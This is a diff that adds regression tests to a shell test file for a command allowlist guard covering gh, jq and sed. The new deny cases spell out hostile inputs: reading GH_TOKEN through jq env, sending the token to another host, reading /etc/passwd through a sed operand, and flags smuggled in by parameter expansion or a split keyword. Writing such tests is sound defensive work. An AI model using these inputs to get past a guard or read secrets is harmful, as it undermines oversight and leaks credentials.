@@ -321,6 +321,49 @@ expect_allow 'a quoted sed program containing a space' \
 expect_allow 'a quoted jq expression containing spaces' \
   "gh api rate_limit --jq '.resources | to_entries | map(.key)'"
 
+# --- Regressions: an allowlisted flag that is itself the write ---------------
+#
+# The argv inversion closed the "another spelling" class, and review moved on to
+# a different one: entries the allowlist itself granted, and effects that depend
+# on state outside argv. A flag is on the list only once its effect is known.
+
+expect_deny 'gh api --cache writes a response cache' "gh api repos/devantler-tech/monorepo --cache 1h"
+expect_deny 'gh api --cache in attached form' "gh api repos/devantler-tech/monorepo --cache=1h"
+expect_deny 'gh api --hostname sends the token to another host' \
+  "gh api --hostname example.com /test"
+expect_deny 'gh pr view --web launches a browser' "gh pr view 1 --repo devantler-tech/monorepo --web"
+expect_deny 'gh issue list --web launches a browser' "gh issue list --repo devantler-tech/ksail --web"
+expect_deny 'an unrecognised flag on a gh read verb' "gh pr list --repo devantler-tech/ksail --nope"
+expect_allow 'the ordinary read verbs still pass their real flags' \
+  "gh pr list --repo devantler-tech/platform --state open --limit 100 --json number,title"
+
+# jq reads process state without touching the filesystem.
+expect_deny 'jq env exposes the process environment' "gh pr list --json number | jq -n env"
+expect_deny 'jq ENV-variable access exposes the process environment' "gh pr list --json number | jq '\$ENV.GH_TOKEN'"
+expect_deny 'jq getpath over env' "gh pr list --json number | jq 'env.GH_TOKEN'"
+expect_allow 'an ordinary jq program is untouched' \
+  "gh pr list --json number | jq -r '.[].number'"
+
+# A parameter expansion carrying a default synthesizes argv with no control over
+# the environment at all — a plain \$VAR stays the documented limit.
+expect_deny 'a defaulted parameter expansion synthesizes a flag' \
+  "gh api \"\${GUARD_UNSET_A:---method}\" \"\${GUARD_UNSET_B:-POST}\" repos/x/y/issues"
+expect_deny 'an alternate-value parameter expansion' "gh api \"\${X:+--method}\" repos/x/y"
+expect_deny 'a word-splitting default outside quotes' "gh api \${X:---method} repos/x/y"
+expect_allow 'a plain parameter expansion is still allowed' "git -C \$REPO log --oneline -5"
+expect_allow 'a plain braced parameter expansion is still allowed' \
+  "gh api repos/\${OWNER}/monorepo/pulls"
+
+# Bash deletes a backslash-newline before the program sees it.
+expect_deny 'an escaped newline hides the operation keyword' \
+  "gh api graphql -f query=\"muta\\
+tion{x}\""
+
+# sed takes an input FILE after its script.
+expect_deny 'a second sed operand is an input file' "gh pr list --json number | sed -n p p"
+expect_deny 'a file operand after a substitution' "gh pr list --json number | sed 's/a/b/' /etc/passwd"
+expect_allow 'a single sed script is still fine' "gh pr list --json number | sed -n '1p'"
+
 # ---------------------------------------------------------------------------
 # Usage
 # ---------------------------------------------------------------------------
